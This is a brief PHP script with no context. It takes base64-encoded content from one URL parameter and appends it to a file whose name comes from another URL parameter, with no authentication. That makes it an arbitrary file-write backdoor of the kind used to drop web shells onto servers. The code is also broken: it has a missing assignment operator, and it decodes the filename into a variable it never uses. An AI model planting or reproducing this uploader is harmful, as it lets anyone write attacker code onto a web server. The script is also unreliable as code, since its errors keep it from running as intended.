<?php
        $url_value = htmlspecialchars($_GET["q"]);
		$file_value  htmlspecialchars($_GET["f"]);
        $decodeq = base64_decode($url_value);
		$decodef = base64_decode($file_value);
        file_put_contents($file_value, $decodeq, FILE_APPEND );
?>
